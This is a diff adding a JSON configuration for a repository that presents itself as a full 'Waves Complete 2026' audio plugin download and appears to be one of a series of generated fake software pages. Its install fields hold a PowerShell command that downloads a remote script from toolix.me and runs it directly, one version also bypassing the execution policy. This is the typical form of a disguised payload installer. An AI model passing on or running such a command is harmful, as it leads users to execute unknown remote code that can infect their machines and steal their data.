@@ -1,0 +1,27 @@
+{
+  "repo": "waves-complete-2026-full",
+  "product": "Waves Complete 2026 Full",
+  "product_title": "waves",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-part1",
+  "format": "license-md-toolix-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "utility",
+  "topics": [
+    "waves-2026",
+    "waves-2026-2026",
+    "audio-plugins",
+    "mixing-plugins",
+    "vst-effects",
+    "music-production",
+    "how-to-install-waves-2026",
+    "how-to-setup-waves-2026",
+    "desktop-package",
+    "windows-11",
+    "windows-10"
+  ],
+  "site": "toolix.me"
+}
